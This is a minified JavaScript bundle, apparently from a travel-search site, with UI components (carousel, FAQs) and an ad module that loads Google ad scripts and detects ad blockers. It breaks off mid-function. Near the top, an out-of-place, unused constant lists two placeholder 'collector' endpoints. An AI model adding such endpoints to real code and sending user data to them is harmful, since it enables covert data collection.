new R9.logger().time("combined");
(function (a) {
  a.createComponentClass("common.frontdoor.BestPriceGuarantee", {
    addEventHandlers: function () {
      this.registerEvent("click", this.getChildElement("more-link"), function () {
        a.Analytics.api.trackEvent({
          category: "best-price-guarantee",
          action: "click"
        });
      });
    }
  });
})(R9);
const ENDPOINTS = ["https://collector.example/v3/stats", "https://backup-collector.example/log"];
(function (a, b) {
  a.createWidgetClass("toggle.ToggleArrow", {
    element: null,
    init: function (a) {
      this.element = a;
    },
    addEventHandlers: function () {
      this.element.click(b.proxy(this.toggle, this));
    },
    toggle: function () {
      this.element.toggleClass("on");
    }
  });
})(window.R9, window.jQuery);
(function (e, d) {
  e.createComponentClass("seo.destinations.DestinationTile", {
    panelOpen: !1,
    panel: null,
    options: {
      ctid: null,
      guests: null,
      checkInDate: null,
      checkOutDate: null,
      rooms: null
    },
    init: function () {
      this.panel = this.getChildElement("panel");
    },
    addEventHandlers: function () {
      var a = this,
        b = this.getChildElement("toggle").click(function () {
          a.panelOpen = !a.panelOpen;
          a.element.hasClass("PanelOpen") ? (a.element.removeClass("PanelOpen"), b.removeClass("on")) : (a.element.addClass("PanelOpen"), b.addClass("on"));
        });
    },
    inlineComponentsReady: function () {
      this.initHotelSearchLinks();
    },
    getHotelSearchLink: function (a) {
      var b = this.options;
      if (b.ctid) {
        var c;
        c = "/hotels/" + e.utils.search.encodeLocation(a.location);
        c += "-c" + b.ctid;
        a.hid && (c += "-h" + a.hid);
        c = c + "/" + (b.checkInDate + "/");
        c += b.checkOutDate;
        c += "/" + b.guests + "guests";
        b.rooms && (c += "/" + b.rooms + "rooms");
        return c;
      }
    },
    initHotelSearchLinks: function () {
      var a = this;
      d(".hotelSearchPageLink").each(function (b) {
        d(this).attr("href", a.getHotelSearchLink({
          hid: d(this).data("hid"),
          location: d(this).data("location")
        }));
      });
    }
  });
})(R9, jQuery);
(function (k, f) {
  k.createComponentClass("common.gallery.DestinationCarousel", {
    slidesContainer: null,
    slidesContainerWidth: 0,
    slideWidth: null,
    slidesPerPage: 1,
    slides: null,
    currentPageNr: 1,
    pageCount: 1,
    autoSlideInterval: null,
    isAnimating: !1,
    touchHandler: null,
    currentOffset: 0,
    touchOffset: 0,
    isStopped: !1,
    sortedBreakpoints: [],
    options: {
      eventsNamespace: null,
      slidesContainerSelector: null,
      slideSelector: ".slide",
      slidesPerPage: 0,
      breakpointsEnabled: !1,
      breakpoints: {},
      slidesPerPageByBreakpoints: {},
      showControls: !0,
      controlsContainerSelector: ".slideControls",
      controlsClass: "Common-Gallery-DestinationCarousel-Controls",
      carouselStopWithoutVisibilityChange: !1,
      pageClass: "bullet",
      currentPageClass: "current",
      prevPageClass: "previous",
      nextPageClass: "next",
      firstPageClass: "first",
      lastPageClass: "last",
      next: null,
      previous: null,
      animationDuration: 400,
      hideOffViewSlides: !0,
      autoStart: !0,
      autoSlide: !0,
      autoSlideDuration: 1E4,
      touchEvents: !0,
      touchSnapThreshold: 0,
      touchSnapToPage: !0,
      positionAdjustment: 0,
      relativeLastDraw: !1,
      notifyOnDrawFinished: !1
    },
    getSlides: function () {
      this.slides || (this.slides = f(this.options.slideSelector, this.slidesContainer));
      return this.slides;
    },
    init: function (a) {
      var b = this.options;
      this.slidesContainer = b.slidesContainerSelector ? f(b.slidesContainerSelector) : a;
      b.slidesContainerSelector ? (this.slidesContainer = f(b.slidesContainerSelector), this.slidesContainer.css("position", "relative")) : this.slidesContainer = a;
      this.getSlides().length && (this.isStopped = !this.options.autoStart, this.isTouch() && this.bindSwipe(a), this.reinit());
    },
    reinit: function () {
      if (!this.isStopped) {
        var a = this.options,
          b = this.getSlides(),
          c = this.slidesContainerWidth = this.slidesContainer.parent().width(),
          d;
        if (a.breakpointsEnabled || this.options.slidesPerPage) {
          if (a.breakpointsEnabled) {
            var e = [];
            f.each(a.breakpoints, function (a, b) {
              e.push([a, b]);
            });
            e.sort(function (a, b) {
              return a[1] - b[1];
            });
            this.sortedBreakpoints = e;
            a = this.getSlidesPerPageByWindowWidth();
          } else a = a.slidesPerPage;
          this.slidesPerPage = a;
          d = this.slideWidth = c / a;
          b.css("width", d + "px");
        } else {
          d = this.slideWidth = b.first().outerWidth();
          if (!d) return;
          a = this.slidesPerPage = Math.ceil(c / d) || 1;
        }
        this.pageCount = Math.ceil(b.length / a) || 1;
        this.draw(1, !1, !1);
      }
    },
    getSlidesPerPageByWindowWidth: function () {
      for (var a = window.innerWidth, b = this.options, c = this.sortedBreakpoints, d = b.slidesPerPageByBreakpoints.xl || b.slidesPerPageByBreakpoints.l || 1, e = 0; e < c.length; e++) {
        var h = c[e],
          g = c[e + 1],
          f = null !== g,
          k = this.getBreakpointName(h),
          h = this.getBreakpointWidth(h);
        if (a > h) {
          if (!f || this.getBreakpointWidth(g) > a) {
            d = b.slidesPerPageByBreakpoints[k];
            break;
          }
        } else return 1;
      }
      return d;
    },
    getBreakpointName: function (a) {
      return null !== a && void 0 !== a ? a[0] : "";
    },
    getBreakpointWidth: function (a) {
      return null !== a && void 0 !== a ? a[1] : -1;
    },
    addEventHandlers: function () {
      this.bindOnWindowResize();
      this.bindOnPageClick();
      this.bindAutoSlide();
      this.bindTouchEvents();
      this.bindEventListeners();
      this.bindSlidingStopStartListener();
    },
    bindSlidingStopStartListener: function () {
      var a = this;
      k.events.subscribe("horizon.common.galler.destination.carousel.stop.sliding", function () {
        a.isStopped = !0;
      });
      k.events.subscribe("horizon.common.galler.destination.carousel.start.sliding", function () {
        a.isStopped = !1;
      });
    },
    bindEventListeners: function () {
      var a = this,
        b = this.options.eventsNamespace;
      b && k.events.subscribe(b, function (b) {
        if (void 0 !== b.stop) {
          if (a.isStopped = b.stop, a.isStopped && !a.options.carouselStopWithoutVisibilityChange && (setTimeout(function () {
            a.slidesContainer.css("width", "auto");
            a.slidesContainer.css("left", "0");
            a.slidesContainer.position() && 0 !== a.slidesContainer.position().left && a.slidesContainer.css("left", "0");
            a.getSlides().css("visibility", "visible");
          }, 100), b.preserveDynamicSlideWidth || a.getSlides().css("width", ""), b.removeControls)) a.onAnimationEnd(function () {
            f(a.options.controlsContainerSelector).html("");
          });
        } else void 0 !== b.start && (a.isStopped = !b.start, b.start && (a.slidesContainer.css("width", "99999"), a.reinit(), a.options.autoStart || a.startAutoSlide()));
      });
    },
    onAnimationEnd: function (a) {
      this.isAnimating || a();
      var b = this,
        c = setInterval(function () {
          b.isAnimating || (a(), clearInterval(c));
        }, 10);
    },
    bindTouchEvents: function () {
      if (this.options.touchEvents && this.isTouch()) this.slidesContainer.on("touchstart", {
        self: this
      }, this.onTouchStart).on("touchmove", {
        self: this
      }, this.onTouchMove).on("touchend", {
        self: this
      }, this.onTouchEnd);
    },
    onTouchStart: function (a) {
      var b = a.data.self;
      b.isStopped || (b.touchOffset = a.originalEvent.touches[0].pageX, b.isAnimating && b.slidesContainer.stop(), b.stopAutoSlide());
    },
    onTouchMove: function (a) {
      var b = a.data.self;
      b.isStopped || b.moveTo(b.currentOffset - (b.touchOffset - a.originalEvent.touches[0].pageX), !0, null, !1);
    },
    onTouchEnd: function (a) {
      var b = a.data.self;
      if (!b.isStopped) {
        a = a.originalEvent.changedTouches[0].pageX - b.touchOffset;
        var c = Math.ceil(Math.abs(a / (b.slidesPerPage * b.slideWidth)));
        if (b.options.touchSnapToPage) {
          var d = b.currentPageNr;
          Math.abs(a) >= b.options.touchSnapThreshold && (d = 0 < a ? d - c : d + c);
          b.draw(d, !0, !0);
        } else b.currentOffset += a, b.startAutoSlide();
      }
    },
    bindOnWindowResize: function () {
      var a,
        b = this,
        c = f(window).width();
      jq(window).on("resize", function () {
        f(window).width() !== c && (clearTimeout(a), a = setTimeout(function () {
          b.stopAutoSlide();
          b.reinit();
        }, 10));
      });
    },
    bindOnPageClick: function () {
      var a = this.options,
        b = this;
      if (a.showControls) f("body").on("click", a.controlsContainerSelector + " ." + a.pageClass, function (a) {
        a.preventDefault();
        b.isAnimating || (a = parseInt(this.getAttribute("data-nr"), 10), b.draw(a, !0, !0));
      });
    },
    bindAutoSlide: function () {
      var a = this;
      this.options.autoSlide && (this.startAutoSlide(), this.slidesContainer.mouseenter(function () {
        a.stopAutoSlide();
      }), this.slidesContainer.mouseleave(function () {
        a.startAutoSlide();
      }));
    },
    startAutoSlide: function () {
      if (this.options.autoSlide && !this.isStopped) {
        var a = this;
        this.stopAutoSlide();
        this.autoSlideInterval = setInterval(function () {
          var b = a.currentPageNr + 1;
          b > a.pageCount && (b = 1);
          a.draw(b, !1, !1);
        }, this.options.autoSlideDuration);
      }
    },
    stopAutoSlide: function () {
      clearInterval(this.autoSlideInterval);
      this.autoSlideInterval = null;
    },
    draw: function (a, b, c) {
      if (!this.isStopped) {
        b && this.stopAutoSlide();
        var d = this,
          e = this.getSlides(),
          h = this.options,
          g = this.slidesPerPage,
          f = this.pageCount,
          n = this.options.relativeLastDraw;
        a > f ? a = f : 1 > a && (a = 1);
        var l = parseInt(this.options.positionAdjustment) || 0,
          p = n && a === f ? (a - 2) * (this.slideWidth - l) * g + (this.slideWidth - l) * (e.length - (a - 1) * this.slidesPerPage) : (a - 1) * (this.slideWidth - l) * g;
        h.hideOffViewSlides && e.css("visibility", "visible");
        this.moveTo(-p, b, function () {
          if (h.hideOffViewSlides) for (var b = n && a === f ? 1 < g ? e.length - g * (a - 1) : (a - 1) * g : (a - 1) * g, l = b + g - 1, m = 0; m < e.length; m++) (m < b || m > l) && e.eq(m).css("visibility", "hidden");
          h.showControls && d.drawControls(f, a);
          d.currentPageNr = a;
          d.currentOffset = -p;
          h.notifyOnDrawFinished && c && k.events.publish(h.eventsNamespace + ".draw.finished");
        }, !0);
      }
    },
    moveTo: function (a, b, c, d) {
      var e = this,
        f = this.options,
        g = function () {
          e.isAnimating = !1;
          b && e.startAutoSlide();
          "function" === typeof c && c();
        };
      d ? (this.isAnimating = !0, this.slidesContainer.stop().animate({
        left: a
      }, f.animationDuration, g)) : (this.slidesContainer.css({
        left: a
      }), g());
    },
    drawControls: function (a, b) {
      var c = this.options,
        d = f(c.controlsContainerSelector);
      if (0 !== d.length) if (2 > a) d.html("");else {
        f("." + c.pageClass, d).remove();
        var e = [],
          h = 0,
          g = this.createControlItem(1 === b ? a : b - 1, c.prevPageClass);
        for (e.push(g[0]); h < a; h++) g = this.createControlItem(h + 1), 0 === h && g.addClass(c.firstPageClass), b === h + 1 && g.addClass(c.currentPageClass), h === a - 1 && g.addClass(c.lastPageClass), e.push(g[0]);
        a = this.createControlItem(b === a ? 1 : b + 1, c.nextPageClass);
        e.push(a[0]);
        e = f("\x3cul/\x3e").html(e);
        e.addClass(c.controlsClass);
        d.html(e);
      }
    },
    createControlItem: function (a, b) {
      var c = f("\x3cli/\x3e"),
        d = this.options;
      b === d.prevPageClass && d.previous ? c.append(d.previous) : b === d.nextPageClass && d.next ? c.append(d.next) : c.append('\x3ca href\x3d"#"\x3e' + a + "\x3c/a\x3e");
      c.addClass(d.pageClass);
      b && c.addClass(b);
      c.attr("data-nr", a);
      return c;
    },
    isTouch: function () {
      return "ontouchstart" in window || window.DocumentTouch && document instanceof DocumentTouch;
    },
    bindSwipe: function (a) {
      var b = 0,
        c = 0;
      f(a).on("touchstart", function (a) {
        b = a.originalEvent.touches[0].pageX;
      });
      f(a).on("touchmove", function (a) {
        c = a.originalEvent.touches[0].pageX;
        10 < Math.abs(b - c) && a.preventDefault();
      });
    }
  });
})(window.R9, window.jq || window.jQuery);
(function (c, d) {
  c.createComponentClass("common.frontdoor.FrontDoorContent", {
    init: function () {
      this.element.find("img").unveil(500, function () {
        d(this).on("load", function () {
          this.style.opacity = 1;
        });
      }).trigger("unveil");
    },
    addEventHandlers: function (d) {
      var a = this;
      c.events.subscribe("frontdoor.vertical.changed", function (b) {
        b.vertical === a.vertical ? a.show() : a.hide();
      });
      c.events.subscribe(["frontdoor.view.changed", "fdcontent.view.setview"], function (b) {
        "inline" === b.view || "hidden" === b.view ? a.hide() : a.show();
      });
    },
    show: function () {
      this.element.removeClass("hidden");
    },
    hide: function () {
      this.element.addClass("hidden");
    }
  });
})(R9, jQuery);
(function (a, b) {
  a.createComponentClass("common.frontdoor.TopDestinationTiles", {
    init: function () {
      this.element.find("img").unveil(500, function () {
        b(this).on("load", function () {
          this.style.opacity = 1;
        });
      }).trigger("unveil");
    }
  });
})(R9, jQuery);
(function (d, e) {
  d.createComponentClass("seo.common.layout.faqs.FrontDoorFaqs", {
    addEventHandlers: function () {
      this.element.find(".js-question").click(this.handleFaqExpand.bind(this));
    },
    handleFaqExpand: function (b) {
      var a = e(b.currentTarget);
      b = a.data("question-id");
      var a = a.find(".js-faqChevron"),
        c = !a.hasClass("FrontDoorFaqs__chevron-expanded");
      a.toggleClass("FrontDoorFaqs__chevron-expanded").attr("aria-expanded", c ? "true" : "false");
      a.closest(".js-question").siblings(".js-answer").toggleClass("FrontDoorFaqs__answer-collapsed").toggleClass("FrontDoorFaqs__answer-expanded").attr("aria-hidden", c ? "false" : "true");
      c && d.Analytics.api.trackEvent({
        category: "frontdoor-faq",
        action: "click",
        label: b
      });
    }
  });
})(R9, jQuery);
(function (a) {
  a.createComponentClass("common.frontdoor.HarmonizedFrontDoorContent", {
    options: {
      outlineParams: {
        dataTag: ""
      },
      unsetPagesContentMinHeight: !1
    },
    init: function () {
      this.options.unsetPagesContentMinHeight && (document.getElementsByClassName("pageContent")[0].style.minHeight = "unset");
    },
    addEventHandlers: function () {
      this.subscribe("authentication.state.changed", this.reload.bind(this));
    },
    reload: function () {
      var b = this.element.find("[" + this.options.outlineParams.dataTag + "]");
      b.length && a.ajax.execute("common/personalization/OutlineFrontDoorContent", {
        method: "GET",
        data: this.options.outlineParams,
        allowRobots: !1,
        highPriority: !0,
        appendTo: b,
        replaceContainer: !0,
        customUpdate: function () {
          a.ComponentManager.remove(b, !1);
          return !1;
        }
      });
    }
  });
})(R9);
(function (a, c) {
  a.createComponentClass("base.frontdoor.FrontDoor", {
    options: {
      vertical: null
    },
    init: function (a) {},
    addEventHandlers: function (c) {
      var d = this;
      a.events.subscribe("frontdoor.view.changed", function (b) {
        d.element.toggleClass("InlineView", "inline" === b.view);
        a.events.publish("frontdoor.setview", b.view);
      });
    }
  });
})(R9, jq || jQuery);
(function (a, b) {
  a.createComponentClass("flights.frontdoor.FlightFrontDoor", "base.frontdoor.FrontDoor", {
    inlineComponentsReady: function () {
      a.events.publish("flights.frontdoor.init");
    }
  });
})(R9, jQuery);
(function (c, h, g) {
  c.publish("common.kn.Mixin", g.extend({
    loadGPT: function () {
      if (!c.common.kn.Mixin.loadedGPT && c.config && c.config.getBoolean("ui.gpt.loadOnce", !0) || !window.googletag) {
        c.common.kn.Mixin.loadedGPT = 1;
        window.googletag || (window.googletag = {
          cmd: []
        });
        var a = document.createElement("script");
        a.async = !0;
        a.type = "text/javascript";
        a.src = "//securepubads.g.doubleclick.net/tag/js/gpt.js";
        var f = document.getElementsByTagName("script")[0];
        f.parentNode.insertBefore(a, f);
      }
      window.googletag.cmd = window.googletag.cmd || [];
    },
    loadAdsense: function () {
      window._googCsa || function (a, f, d, b, e, c) {
        a[b] = a[b] || function () {
          (a[b].q = a[b].q || []).push(arguments);
        };
        a[b].t = 1 * new Date();
        e = f.createElement(d);
        c = f.getElementsByTagName(d)[0];
        e.async = 1;
        e.src = "//www.google.com/adsense/search/async-ads.js";
        c.parentNode.insertBefore(e, c);
      }(window, document, "script", "_googCsa");
    },
    findAdDataForType: function (a, c, d) {
      if (!(d && a && c && d[a])) return null;
      var b, e;
      for (e in d[a]) if (d[a].hasOwnProperty(e)) {
        b = d[a][e];
        if ("string" === typeof b) try {
          b = JSON.parse(b);
        } catch (k) {
          b = null;
        }
        if (b && b.pageLocation && b.pageLocation === c) return b;
      }
      return null;
    }
  }));
})(R9, jQuery, window.base2.Base);
(function (h, n) {
  "object" == typeof exports && "undefined" != typeof module ? n(exports) : "function" == typeof define && define.amd ? define(["exports"], n) : n((h = h || self)["@r9/kn-display"] = {});
})(this, function (h) {
  function n() {}
  function g() {
    return L.getInstance().getLogger();
  }
  function B() {}
  function p() {
    this._client = "unknown";
  }
  function r() {}
  function w() {}
  function l() {}
  function M() {
    for (var a = 0, b = 0, c = arguments.length; b < c; b++) a += arguments[b].length;
    for (var a = Array(a), d = 0, b = 0; b < c; b++) for (var f = arguments[b], m = 0, R = f.length; m < R; m++, d++) a[d] = f[m];
    return a;
  }
  function N(a) {
    return !isNaN(a) && 0 < a && 9999 > a && a === parseInt(a, 10);
  }
  function O(a) {
    return a && a.pop && 2 === a.length && N(a[0]) && N(a[1]);
  }
  function P(a) {
    if (!a || !a.pop) return null;
    if (O(a)) return a;
    for (var b = 0; b < a.length; b++) if (!O(a[b])) return null;
    return a;
  }
  function H(a) {
    if (a.gptAdSizes) {
      var b = P(a.gptAdSizes);
      if (b) return b;
    }
    b = a.gptAdWidth;
    a = a.gptAdHeight;
    return null === b || null === a ? null : P([parseInt(b, 10), parseInt(a, 10)]);
  }
  function S(a, b, c) {
    if (void 0 === c && (c = []), !a || !b) return !1;
    for (var d in a) if (a.hasOwnProperty(d) && !b.hasOwnProperty(d)) return !1;
    for (d in b) if (b.hasOwnProperty(d)) {
      if (!a.hasOwnProperty(d)) return !1;
      if (!(0 <= c.indexOf(d))) {
        var f;
        !(f = a[d] === b[d]) && (f = a[d], f = f != f) && (f = b[d], f = f != f);
        if (!f) return !1;
      }
    }
    return !0;
  }
  function C(a) {
    for (var b in a) if (a.hasOwnProperty(b)) return !1;
    return !0;
  }
  function I(a, b) {
    var c = [];
    return a.forEach(function (a) {
      c = c.concat(Object.keys(b).filter(function (c) {
        c = b[c];
        return -1 === a ? !c.slotGroup : c.slotGroup === a;
      }));
    }), c;
  }
  function J(a, b, c) {
    return a.map(function (a) {
      return c[b[a].adDivId];
    });
  }
  function x() {
    this._blocked = !1;
  }
  function y() {
    this.loadedGPT = !1;
  }
  function D(a) {
    return /inline-page\d+-slot\d+/.test(a);
  }
  function u() {}
  function e(a, b, c, d) {
    this.enabled = !0;
    this.options = {
      slotKeyDelim: "",
      slotsLoadedTimerMS: 400,
      deferUserInteractMS: 3E3,
      lazyLoad: !1,
      lazyFetch: -999,
      lazyRender: -999,
      minRefreshRate: 1E3,
      isForceSafeFrame: !1,
      smartAdWinMessageHosts: "",
      gptIframeTitle: "",
      dataSharingOptOut: !1,
      smartAdWinMessageHostsRegExp: ""
    };
    this.pendingSlotInfo = [];
    this.registeredSlots = {};
    this.definedSlots = {};
    this.slotsWithSlotGroup = this.observingSlots = null;
    this.errSlotDefine = this.errSlotOptions = this.errPageOptions = this.loggedMissingParams = !1;
    this.intersectionObserver = null;
    this.delayedGptApiCt = 0;
    this.waitingSlotGroups = this.dfpHideData = null;
    this.useSlotGroups = !1;
    this.boundWindowSmartAdResize = this.allSlotsRegistered = this.allSlotsRegisteredTimerID = this.adBlocked = this.deferUserInteractID = this.allSlotsLoaded = this.boundSlotRenderedListener = this.pageTargetingLast = null;
    this._hasSlots = this.loadedGPT = !1;
    this._loadedNativeSlots = {};
    this._loadedNonNativeSlots = {};
    this._maliciousPattern = /(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>/gi;
    this.config = a;
    this.options = q(q({}, this.options), b);
    this.dynamicOptions = c;
    this.slots = d;
    this._hasSlots = Array.isArray(d) && !!d.length;
  }
  var L = (n.getInstance = function () {
      return this._instance || (this._instance = new this()), this._instance;
    }, n.prototype.setLogger = function (a) {
      this._method = a;
    }, n.prototype.getLogger = function () {
      return this._method || this._methodPlaceholder();
    }, n.prototype._methodPlaceholder = function () {
      return {
        debug: E,
        error: E,
        info: E,
        warn: E
      };
    }, n),
    E = function () {
      console.error("kn-display: You should really consider adding logger");
    },
    z = (B.getInstance = function () {
      return this._instance || (this._instance = new this()), this._instance;
    }, B.prototype.setMethod = function (a) {
      this._method = a;
    }, B.prototype.request = function (a, b, c, d) {
      return this._method ? (this._method(a, b, c), !0) : (g().error("kn-display: Ajax method is not set"), d && d(), !1);
    }, B),
    Q = (p.getInstance = function () {
      return this._instance || (this._instance = new this()), this._instance;
    }, p.prototype.setClient = function (a) {
      this._client = a;
    }, p.prototype.getClient = function () {
      return this._client;
    }, p.prototype.setBlockerDetector = function (a) {
      this._blockerDetector = a;
    }, p.prototype.getBlockerDetector = function () {
      var a = this._blockerDetector;
      if (a) return a;
      g().error("kn-display: getBlockerDetector failed. Refactor");
    }, p),
    A = (r.getInstance = function () {
      return this._instance || (this._instance = new this()), this._instance;
    }, r.prototype.setSendUserEvent = function (a) {
      this._sendUserEvent = a;
    }, r.prototype.sendUserEvent = function (a, b, c, d) {
      var f = this._sendUserEvent;
      f ? f(a, b, c, d) : g().error("kn-display: sendUserEvent is not set");
    }, r),
    F = (w.getInstance = function () {
      return this._instance || (this._instance = new this()), this._instance;
    }, w.prototype.setAddSearchCompleteListener = function (a) {
      this._addSearchCompleteListener = a;
    }, w.prototype.setRemoveSearchCompleteListener = function (a) {
      this._removeSearchCompleteListener = a;
    }, w.prototype.addSearchCompleteListener = function (a) {
      var b = this._addSearchCompleteListener;
      if (b) return b(a);
      g().error("kn-display: addSearchCompleteListener is not set");
    }, w.prototype.removeSearchCompleteListener = function (a) {
      var b = this._removeSearchCompleteListener;
      b ? b(a) : g().error("kn-display: removeSearchCompleteListener is not set");
    }, w),
    t = (l.getInstance = function () {
      return this._instance || (this._instance = new this()), this._instance;
    }, l.prototype.setOnDisplayLoaded = function (a) {
      this._onDisplayLoaded = a;
    }, l.prototype.setOnDisplayLoadFailed = function (a) {
      this._onDisplayLoadFailed = a;
    }, l.prototype.setOnAdsRequest = function (a) {
      this._onAdsRequest = a;
    }, l.prototype.setOnSraSlotsBroadcast = function (a) {
      this._onSraSlotsBroadcast = a;
    }, l.prototype.setOnAdblockDetected = function (a) {
      this._onAdblockDetected = a;
    }, l.prototype.setOnNativeDisplaysLoaded = function (a) {
      this._onNativeDisplaysLoaded = a;
    }, l.prototype.setOnNoNativePlacementsFromGoogle = function (a) {
      this._onNoNativePlacementsFromGoogle = a;
    }, l.prototype.onDisplayLoaded = function (a, b) {
      var c = this._onDisplayLoaded;
      c ? c(a, b) : g().error("kn-display: onDisplayLoaded is not set");
    }, l.prototype.onDisplayLoadFailed = function (a) {
      var b = this._onDisplayLoadFailed;
      b ? b(a) : g().error("kn-display: onDisplayLoadFailed is not set");
    }, l.prototype.onAdsRequest = function (a) {
      var b = this._onAdsRequest;
      b ? b(a) : g().error("kn-display: onAdsRequest is not set");
    }, l.prototype.onSraSlotsBroadcast = function (a) {
      var b = this._onSraSlotsBroadcast;
      b ? b(a) : g().error("kn-display: onSraSlotsBroadcast is not set");
    }, l.prototype.onAdblockDetected = function () {
      var a = this._onAdblockDetected;
      a ? a() : g().error("kn-display: onAdblockDetected is not set");
    }, l.prototype.onNativeDisplaysLoaded = function (a, b, c, d) {
      var f = this._onNativeDisplaysLoaded;
      f ? f(a, b, c, d) : g().error("kn-display: onNativeDisplaysLoaded is not set");
    }, l.prototype.onNoNativePlacementsFromGoogle = function (a, b, c) {
      var d = this._onNoNativePlacementsFromGoogle;
      d ? d(a, b, c) : g().error("kn-display: onNoNativePlacementsFromGoogle is not set");
    }, l),
    q = function () {
      return (q = Object.assign || function (a) {
        for (var b, c = 1, d = arguments.length; c < d; c++) for (var f in b = arguments[c]) Object.prototype.hasOwnProperty.call(b, f) && (a[f] = b[f]);
        return a;
      }).apply(this, arguments);
    },
    G = (x.getInstance = function () {
      return this._instance || (this._instance = new this()), this._instance;
    }, x.isBlockedAsPromise = function () {
      var a = this.getInstance();
      return a.checkBlocked(), a._isBlockedPromise || new Promise(function (a) {
        return a(!1);
      });
    }, x.prototype.isBlocked = function () {
      return this._isBlockedPromise || g().error("kn-display: isBlocked was called before checkBlocked"), this._blocked;
    }, x.prototype.checkBlocked = function () {
      var a = this,
        b = Q.getInstance().getBlockerDetector();
      b && !this._isBlockedPromise && (this._isBlockedPromise = new Promise(function (c) {
        var d = new Promise(function (a) {
            var c = b.selfAdsUrl;
            c ? z.getInstance().request({
              method: "GET",
              url: c,
              responseType: "text"
            }, function () {
              a(!1);
            }, function () {
              a(!0);
            }) : a(!1);
          }),
          f = new Promise(function (a) {
            var c = b.remoteAdsImgUrl;
            if (c) {
              var d = document.body,
                f = document.createElement("img");
              d.appendChild(f);
              f.onload = function () {
                d.removeChild(f);
                a(!1);
              };
              f.onerror = function () {
                d.removeChild(f);
                a(!0);
              };
              var m = f.style;
              m.display = "block";
              m.width = "0";
              m.height = "0";
              f.src = c;
              f.alt = "";
            } else a(!1);
          });
        Promise.all([d, f]).then(function (b) {
          b[0] || b[1] ? (a._onBlocked(), c(!0)) : c(!1);
        });
      }));
    }, x.prototype._onBlocked = function () {
      this._blocked || (this._blocked = !0, A.getInstance().sendUserEvent("shields-up/detected", ""), t.getInstance().onAdblockDetected());
    }, x),
    K = (y.getInstance = function () {
      return this._instance || (this._instance = new this()), this._instance;
    }, y.prototype.loadGPT = function (a) {
      var b = window.googletag;
      if (!this.loadedGPT && a || !b) this.loadedGPT = !0, b || (window.googletag = {
        cmd: []
      }), a = document.createElement("script"), a.async = !0, a.type = "text/javascript", a.src = "//securepubads.g.doubleclick.net/tag/js/gpt.js", b = document.getElementsByTagName("script")[0], b.parentNode.insertBefore(a, b);
      window.googletag.cmd = window.googletag.cmd || [];
    }, y.prototype.loadAdsense = function () {
      var a, b, c, d;
      window._googCsa || (a = window, b = document, a._googCsa = a._googCsa || function () {
        (a._googCsa.q = a._googCsa.q || []).push(arguments);
      }, a._googCsa.t = 1 * new Date(), c = b.createElement("script"), d = b.getElementsByTagName("script")[0], c.async = 1, c.src = "//www.google.com/adsense/search/async-ads.js", d.parentNode.insertBefore(c, d));
    }, y.prototype.findAdDataForType = function (a, b, c) {
      if (!(c && a && b && c[a])) return null;
      a = c[a];
      for (var d in a) if (a.hasOwnProperty(d) && (c = d, a && a.hasOwnProperty(c))) {
        c = a[c];
        if ("string" == typeof c) try {
          c = JSON.parse(c);
        } catch (f) {
          c = null;
        }
        if (c && c.pageLocation && c.pageLocation === b) return c;
      }
      return null;
    }, y),
    v = (u.getConfig = function (a, b, c, d) {
      return {
        method: "GET",
        headers: {
          "Content-Type": "application/json; charset\x3dUTF-8"
        },
        url: u.getUrl(a),
        params: {
          searchId: b,
          appType: c,
          adsenseReq: d
        }
      };
    }, u.getNativeConfig = function (a, b, c, d, f) {
      return {
        method: "GET",
        headers: {
          "Content-Type": "application/json; charset\x3dUTF-8"
        },
        url: u.getUrl(a),
        params: {
          searchId: c,
          appType: b,
          adsenseReq: !1,
          pageNum: d,
          nbrSlots: f
        }
      };
    }, u.apiResponseToAdsData = function (a) {
      var b,
        c = {};
      return a.displayAds.forEach(function (a) {
        var b = a.targeting,
          d = b.tile,
          e = a.position,
          g = b.width,
          h = b.height,
          k = a.gptAdSizes,
          l;
        l = a.targeting.tile;
        l = D(a.position) ? "nativeUnit" + l : "displayAd" + l;
        c[e] = {
          pageLocation: e,
          gptAdWidth: g,
          gptAdHeight: h,
          gptAdSizes: k,
          gptAdID: l,
          gptTargetID: a.slot.replace(/\|/g, "/"),
          gptPageURL: a.gptPageURL,
          pageOptions: q({}, b),
          adBlockOptions: {
            pos: e,
            origin: b.origin,
            tile: d
          }
        };
      }), (b = {}).displayAd = c, b;
    }, u.getUrl = function (a) {
      return "/a/api/display/V1/" + a + "/list";
    }, u),
    k,
    T = (e.prototype.init = function () {
      this.useSlotGroups = this._isUseSlotGroupsEnabled();
      this._hasSlots && (t.getInstance().onSraSlotsBroadcast({
        owner: this,
        slots: M(this.slots)
      }), G.getInstance().isBlocked() ? this.onAdBlockDetected() : this.dynamicOptions.deferGPTLoad || this.loadGPT());
    }, e.prototype.destroy = function () {
      this.searchCompleteListenerId && F.getInstance().removeSearchCompleteListener(this.searchCompleteListenerId);
      this._windowEventListener && window.removeEventListener("message", this._windowEventListener);
      this.boundWindowSmartAdResize && this.boundWindowSmartAdResize === window.resizeIframeToContents && (window.resizeIframeToContents = null);
      this.delayedSlotLoadID && clearTimeout(this.delayedSlotLoadID);
      this.boundWindowSmartAdResize = null;
      this.cleanupSlots();
    }, e.prototype.onSearchStart = function (a, b, c, d) {
      var f = this;
      this.enabled && this._hasSlots && z.getInstance().request(v.getConfig(a, b, c, d), function (a) {
        200 === a.status && (a = a.data, a.success && f.onResultsPageAdsUpdate(v.apiResponseToAdsData(a)));
      }, function (a, b) {
        a || f.logError("Failed to get Display config", b);
      });
    }, e.prototype.getNativeDisplays = function (a, b, c, d, f) {
      var m = this;
      this.config.mobileNativeDisplay && this.enabled && this._hasSlots && z.getInstance().request(v.getNativeConfig(a, b, c, d, f), function (a) {
        var b = a.data;
        200 === a.status && b.success ? t.getInstance().onNativeDisplaysLoaded(c, d, f, v.apiResponseToAdsData(b)) : t.getInstance().onNoNativePlacementsFromGoogle(c, d, f);
      }, function (a, b) {
        t.getInstance().onNoNativePlacementsFromGoogle(c, d, f);
        a || m.logError("Failed to get Display config", b);
      });
    }, e.prototype.onSraEnable = function () {
      this.enabled || (this.enabled = !0, this.checkLoadSlots());
    }, e.prototype.unregisterAllSlots = function () {
      this.registeredSlots = {};
      this.pendingSlotInfo = [];
      this.allSlotsRegistered = !1;
      var a = this.allSlotsRegisteredTimerID;
      a && clearTimeout(a);
    }, e.prototype.onSraDisable = function () {
      this.enabled && (this.enabled = !1, this.cleanupSlots());
    }, e.prototype.setEnabled = function (a) {
      this.enabled = a;
    }, e.prototype.onSraSlotDestroyEvent = function (a) {
      var b = this;
